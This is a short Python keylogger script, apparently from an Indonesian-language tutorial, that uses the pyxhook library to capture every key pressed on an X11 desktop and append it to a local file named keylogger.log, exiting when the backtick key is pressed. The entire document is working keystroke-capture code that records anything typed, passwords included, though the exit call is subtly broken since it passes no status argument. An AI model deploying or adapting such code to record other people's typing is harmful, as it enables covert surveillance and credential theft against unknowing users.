import pyxhook
import os

def onKeyDown(event):
    # Kita contohkan, kalo kita menekan tombol ` maka program akan keluar
    if(event.Key == 'grave'):
        os._exit()
    else:
        # Membuka file keylogger.log dengan mode append (a)
        with open('keylogger.log', 'a') as f :
            f.write('{}\n'.format(event.Key))


hook = pyxhook.HookManager()
hook.KeyDown = onKeyDown
hook.HookKeyboard()

try:
    hook.start()
except :
    pass
